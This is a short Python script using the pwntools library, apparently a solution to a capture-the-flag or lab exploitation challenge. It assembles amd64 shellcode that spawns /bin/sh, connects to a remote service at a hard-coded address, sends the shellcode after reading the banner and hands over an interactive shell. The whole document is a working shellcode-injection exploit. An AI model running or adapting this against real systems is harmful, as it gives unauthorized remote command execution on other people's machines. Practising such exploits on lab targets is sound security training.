from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

r = remote("130.192.5.212", 17385)

for _ in range(9):
    print(r.recvline())

r.sendline(shellcode)
r.interactive()